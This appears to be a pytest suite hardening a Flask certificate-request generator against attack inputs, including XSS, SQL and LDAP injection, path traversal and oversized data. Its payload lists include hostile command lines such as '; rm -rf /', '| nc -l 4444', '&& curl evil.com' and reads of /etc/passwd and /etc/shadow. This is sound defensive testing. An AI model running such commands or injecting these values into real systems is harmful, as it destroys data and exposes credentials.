#!/usr/bin/env python
"""
Security Hardening Tests for CSR Generator

Tests for comprehensive input validation, file parsing security, 
injection attacks, and other security vulnerabilities.
"""

import pytest
import json
import base64
from app import app
from csr import CsrGenerator


class TestInputValidationSecurity:
    """Test cases for input validation security measures"""
    
    @pytest.fixture
    def client(self):
        app.config['TESTING'] = True
        with app.test_client() as client:
            yield client

    def test_xss_prevention_in_cn(self, client):
        """Test XSS prevention in Common Name field"""
        malicious_payloads = [
            '<script>alert("xss")</script>',
            '"><script>alert(1)</script>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            'data:text/html,<script>alert(1)</script>',
            '<svg onload=alert(1)>',
            '${alert(1)}',
            '{{alert(1)}}',
            '<iframe src="javascript:alert(1)"></iframe>'
        ]
        
        for payload in malicious_payloads:
            form_data = {
                'CN': payload,
                'C': 'US',
                'keySize': '2048'
            }
            
            response = client.post('/generate', data=form_data)
            # Should either reject the input or sanitize it
            assert response.status_code in [400, 500]
            if response.is_json:
                data = response.get_json()
                assert 'error' in data

    def test_sql_injection_prevention(self, client):
        """Test SQL injection prevention (even though we don't use SQL)"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1#",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "1'; exec xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_payloads:
            form_data = {
                'CN': f"test{payload}.example.com",
                'O': payload,
                'OU': payload,
                'C': 'US'
            }
            
            response = client.post('/generate', data=form_data)
            # Should reject malicious input
            assert response.status_code in [400, 500]

    def test_command_injection_prevention(self, client):
        """Test command injection prevention"""
        command_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "&& dir",
            "`whoami`",
            "$(whoami)",
            "${whoami}",
            "; rm -rf /",
            "| nc -l 4444",
            "&& curl evil.com",
            "; powershell.exe"
        ]
        
        for payload in command_payloads:
            form_data = {
                'CN': f"test{payload}.com",
                'O': f"Company{payload}",
                'C': 'US'
            }
            
            response = client.post('/generate', data=form_data)
            assert response.status_code in [400, 500]

    def test_path_traversal_prevention(self, client):
        """Test path traversal prevention"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for payload in path_payloads:
            form_data = {
                'CN': f"{payload}.com",
                'O': payload,
                'C': 'US'
            }
            
            response = client.post('/generate', data=form_data)
            assert response.status_code in [400, 500]

    def test_unicode_and_encoding_attacks(self, client):
        """Test Unicode and encoding attack prevention"""
        unicode_payloads = [
            '\u0000',  # NULL byte
            '\x00',    # NULL byte
            '\uFEFF',  # BOM
            '\u202E',  # Right-to-left override
            '\u0009',  # Tab
            '\u000A',  # Line feed
            '\u000D',  # Carriage return
            '&#x3C;script&#x3E;',  # HTML entity encoding
            '%3Cscript%3E',        # URL encoding
            '\\u003cscript\\u003e' # Unicode escape
        ]
        
        for payload in unicode_payloads:
            form_data = {
                'CN': f"test{payload}.com",
                'O': f"Company{payload}",
                'C': 'US'
            }
            
            response = client.post('/generate', data=form_data)
            # Should handle Unicode gracefully or reject dangerous characters
            assert response.status_code in [200, 400, 500]

    def test_buffer_overflow_prevention(self, client):
        """Test buffer overflow prevention with extremely long inputs"""
        # Very long string (10MB)
        long_string = 'A' * (10 * 1024 * 1024)
        
        form_data = {
            'CN': long_string,
            'C': 'US'
        }
        
        response = client.post('/generate', data=form_data)
        # Should reject due to size limits (413) or validation error (500)
        assert response.status_code in [413, 500]
        if response.is_json:
            data = response.get_json()
            assert 'error' in data

    def test_json_injection_in_analyze_endpoint(self, client):
        """Test JSON injection prevention in analyze endpoint"""
        json_payloads = [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
            'null',
            'true',
            'false',
            '[]',
            '{}',
            '"string"',
            '{"a": "\u0000"}'
        ]
        
        for payload in json_payloads:
            form_data = {'csr': payload}
            response = client.post('/analyze', data=form_data)
            # Should handle gracefully
            assert response.status_code in [200, 400]

    def test_ldap_injection_prevention(self, client):
        """Test LDAP injection prevention"""
        ldap_payloads = [
            "*)(&",
            "*)(cn=*",
            "*))(|(cn=*",
            "*))%00",
            "admin)(&(password=*))",
            "*))(|(objectClass=*"
        ]
        
        for payload in ldap_payloads:
            form_data = {
                'CN': f"test{payload}.com",
                'O': payload,
                'C': 'US'
            }
            
            response = client.post('/generate', data=form_data)
            assert response.status_code in [400, 500]


class TestFileParsingSecurityHardening:
    """Test cases for file parsing security hardening"""
    
    @pytest.fixture
    def client(self):
        app.config['TESTING'] = True
        with app.test_client() as client:
            yield client

    def test_malformed_pem_handling(self, client):
        """Test handling of malformed PEM files"""
        malformed_pems = [
            "-----BEGIN CERTIFICATE REQUEST-----\nNOT_BASE64_DATA\n-----END CERTIFICATE REQUEST-----",
            "-----BEGIN CERTIFICATE REQUEST-----\n" + "A" * 100000 + "\n-----END CERTIFICATE REQUEST-----",
            "-----BEGIN CERTIFICATE REQUEST-----\n\n-----END CERTIFICATE REQUEST-----",
            "-----BEGIN CERTIFICATE REQUEST-----\n" + "=" * 1000 + "\n-----END CERTIFICATE REQUEST-----",
            "-----BEGIN CERTIFICATE REQUEST-----\n<script>alert(1)</script>\n-----END CERTIFICATE REQUEST-----",
            "INVALID_HEADER\ndata\nINVALID_FOOTER",
            "-----BEGIN CERTIFICATE REQUEST-----\n../../../etc/passwd\n-----END CERTIFICATE REQUEST-----"
        ]
        
        for malformed_pem in malformed_pems:
            form_data = {'csr': malformed_pem}
            response = client.post('/analyze', data=form_data)
            
            # Should handle gracefully without crashing
            assert response.status_code in [200, 400]
            if response.is_json:
                data = response.get_json()
                assert 'valid' in data
                assert data['valid'] is False

    def test_binary_data_injection(self, client):
        """Test handling of binary data injection"""
        binary_payloads = [
            b'\x00\x01\x02\x03\x04\x05',  # Raw binary
            b'\xff\xfe\xfd\xfc',          # High bytes
            b'\x89PNG\r\n\x1a\n',         # PNG header
            b'%PDF-1.4',                  # PDF header
            b'PK\x03\x04',                # ZIP header
            bytes(range(256))             # All possible byte values
        ]
        
        for binary_payload in binary_payloads:
            try:
                # Try to decode as UTF-8, if it fails, encode as base64
                payload_str = binary_payload.decode('utf-8', errors='ignore')
            except:
                payload_str = base64.b64encode(binary_payload).decode('ascii')
            
            form_data = {'csr': payload_str}
            response = client.post('/analyze', data=form_data)
            
            # Should handle gracefully
            assert response.status_code in [200, 400]

    def test_compressed_data_handling(self, client):
        """Test handling of compressed or encoded data"""
        import gzip
        import zlib
        
        test_data = b"malicious payload" * 1000
        
        # Test gzip compressed data
        gzipped = gzip.compress(test_data)
        form_data = {'csr': base64.b64encode(gzipped).decode('ascii')}
        response = client.post('/analyze', data=form_data)
        assert response.status_code in [200, 400]
        
        # Test zlib compressed data
        compressed = zlib.compress(test_data)
        form_data = {'csr': base64.b64encode(compressed).decode('ascii')}
        response = client.post('/analyze', data=form_data)
        assert response.status_code in [200, 400]

    def test_asymmetric_key_parsing_security(self, client):
        """Test security of asymmetric key parsing"""
        malicious_keys = [
            # Malformed RSA key
            """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA<MALFORMED_DATA>
-----END RSA PRIVATE KEY-----""",
            
            # Extremely large key size claim
            """-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC""" + "A" * 10000 + """
-----END PRIVATE KEY-----""",
            
            # Mixed key types
            """-----BEGIN RSA PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDZfUHF
-----END ECDSA PRIVATE KEY-----"""
        ]
        
        for malicious_key in malicious_keys:
            form_data = {
                'csr': '-----BEGIN CERTIFICATE REQUEST-----\ntest\n-----END CERTIFICATE REQUEST-----',
                'privateKey': malicious_key
            }
            response = client.post('/verify', data=form_data)
            
            # Should handle gracefully
            assert response.status_code in [200, 400, 500]
            if response.is_json:
                data = response.get_json()
                assert 'match' in data
                assert data['match'] is False

    def test_certificate_parsing_security(self, client):
        """Test security of certificate parsing"""
        malicious_certs = [
            # Malformed certificate
            """-----BEGIN CERTIFICATE-----
MALFORMED_CERTIFICATE_DATA
-----END CERTIFICATE-----""",
            
            # Certificate with null bytes
            """-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJALQ8+dRY8K8lMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV\x00BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
-----END CERTIFICATE-----""",
            
            # Extremely long certificate
            """-----BEGIN CERTIFICATE-----
""" + "A" * 100000 + """
-----END CERTIFICATE-----"""
        ]
        
        for malicious_cert in malicious_certs:
            form_data = {
                'certificate': malicious_cert,
                'privateKey': 'test-key'
            }
            response = client.post('/verify-certificate', data=form_data)
            
            # Should handle gracefully
            assert response.status_code in [200, 400, 500]


class TestMemoryExhaustionPrevention:
    """Test cases for memory exhaustion prevention"""
    
    @pytest.fixture
    def client(self):
        app.config['TESTING'] = True
        with app.test_client() as client:
            yield client

    def test_large_request_handling(self, client):
        """Test handling of extremely large requests"""
        # Test large form data
        large_data = 'A' * (5 * 1024 * 1024)  # 5MB
        
        form_data = {
            'CN': large_data,
            'C': 'US'
        }
        
        response = client.post('/generate', data=form_data)
        # Should reject due to size limits
        assert response.status_code in [400, 413, 500]

    def test_repeated_field_submission(self, client):
        """Test handling of repeated field submissions"""
        # Create form data with many repeated fields
        form_data = {}
        for i in range(1000):
            form_data[f'extra_field_{i}'] = f'value_{i}'
        
        form_data['CN'] = 'example.com'
        form_data['C'] = 'US'
        
        response = client.post('/generate', data=form_data)
        # Should handle gracefully (extra fields should be ignored)
        assert response.status_code in [200, 400]

    def test_deeply_nested_subject_alt_names(self, client):
        """Test handling of complex Subject Alternative Names"""
        # Create extremely long SAN list
        domains = [f"subdomain{i}.example.com" for i in range(1000)]
        san_string = ",".join(domains)
        
        form_data = {
            'CN': 'example.com',
            'subjectAltNames': san_string,
            'C': 'US'
        }
        
        response = client.post('/generate', data=form_data)
        # Should reject due to length or handle gracefully
        assert response.status_code in [200, 400]


class TestTimingAttackPrevention:
    """Test cases for timing attack prevention"""
    
    @pytest.fixture
    def client(self):
        app.config['TESTING'] = True
        with app.test_client() as client:
            yield client

    def test_consistent_error_response_timing(self, client):
        """Test that error responses have consistent timing"""
        import time
        
        # Test with valid but incorrect data
        valid_form = {'CN': 'example.com', 'C': 'US', 'keySize': '1024'}  # Invalid key size
        
        # Test with completely invalid data
        invalid_form = {'CN': '<script>alert(1)</script>', 'C': 'INVALID'}
        
        # Measure timing for multiple requests
        times_valid = []
        times_invalid = []
        
        for _ in range(5):
            start = time.time()
            client.post('/generate', data=valid_form)
            times_valid.append(time.time() - start)
            
            start = time.time()
            client.post('/generate', data=invalid_form)
            times_invalid.append(time.time() - start)
        
        # Timing should be relatively consistent (not perfect due to system variations)
        avg_valid = sum(times_valid) / len(times_valid)
        avg_invalid = sum(times_invalid) / len(times_invalid)
        
        # Should not have extreme timing differences (more than 10x)
        min_time = min(avg_valid, avg_invalid)
        max_time = max(avg_valid, avg_invalid)
        
        # Avoid division by zero
        if min_time > 0:
            timing_ratio = max_time / min_time
            assert timing_ratio < 10.0
        else:
            # If one time is zero, the other should be small too
            assert max_time < 0.1


class TestCryptographicSecurityHardening:
    """Test cases for cryptographic security hardening"""
    
    def test_weak_key_rejection(self):
        """Test rejection of weak cryptographic parameters"""
        weak_configs = [
            {'CN': 'example.com', 'keySize': 512},    # Too small
            {'CN': 'example.com', 'keySize': 1024},   # Deprecated
            {'CN': 'example.com', 'keyType': 'DSA'},  # Unsupported
            {'CN': 'example.com', 'keyType': 'ECDSA', 'curve': 'P-192'},  # Weak curve
        ]
        
        for config in weak_configs:
            with pytest.raises((KeyError, ValueError)):
                CsrGenerator(config)

    def test_secure_random_generation(self):
        """Test that key generation uses secure randomness"""
        # Generate multiple keys and ensure they're different
        configs = [{'CN': 'example.com'} for _ in range(10)]
        keys = []
        
        for config in configs:
            csr = CsrGenerator(config)
            keys.append(csr.private_key)
        
        # All keys should be unique
        assert len(set(keys)) == len(keys)

    def test_no_weak_digest_algorithms(self):
        """Test that only secure digest algorithms are used"""
        config = {'CN': 'example.com'}
        csr = CsrGenerator(config)
        
        # Should use SHA-256 or better
        assert csr.DIGEST in ['sha256', 'sha384', 'sha512']
        assert csr.DIGEST != 'sha1'  # SHA-1 is deprecated
        assert csr.DIGEST != 'md5'   # MD5 is broken


class TestLoggingSecurityHardening:
    """Test cases for secure logging practices"""
    
    @pytest.fixture
    def client(self):
        app.config['TESTING'] = True
        with app.test_client() as client:
            yield client

    def test_no_sensitive_data_in_logs(self, client):
        """Test that sensitive data is not logged"""
        import logging
        from io import StringIO
        
        # Capture log output
        log_capture = StringIO()
        handler = logging.StreamHandler(log_capture)
        logger = logging.getLogger('app')
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        
        # Submit request with sensitive data
        form_data = {
            'CN': 'secret.example.com',
            'O': 'Secret Organization',
            'OU': 'Top Secret Unit',
            'C': 'US'
        }
        
        response = client.post('/generate', data=form_data)
        
        # Check that private key is not in logs
        log_output = log_capture.getvalue()
        assert '-----BEGIN PRIVATE KEY-----' not in log_output
        assert '-----BEGIN RSA PRIVATE KEY-----' not in log_output
        
        # Check that specific sensitive field values are not in logs
        assert 'Secret Organization' not in log_output
        assert 'Top Secret Unit' not in log_output
        
        logger.removeHandler(handler)

    def test_request_sanitization_in_logs(self, client):
        """Test that malicious requests are sanitized in logs"""
        import logging
        from io import StringIO
        
        log_capture = StringIO()
        handler = logging.StreamHandler(log_capture)
        logger = logging.getLogger('app')
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        
        # Submit malicious request
        form_data = {
            'CN': '<script>alert(1)</script>.com',
            'C': 'US'
        }
        
        response = client.post('/generate', data=form_data)
        log_output = log_capture.getvalue()
        
        # Script tags should be sanitized in logs
        # Check that the log sanitization function is working
        assert '[HTML_REMOVED]' in log_output or '<script>' not in log_output
        
        logger.removeHandler(handler)


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
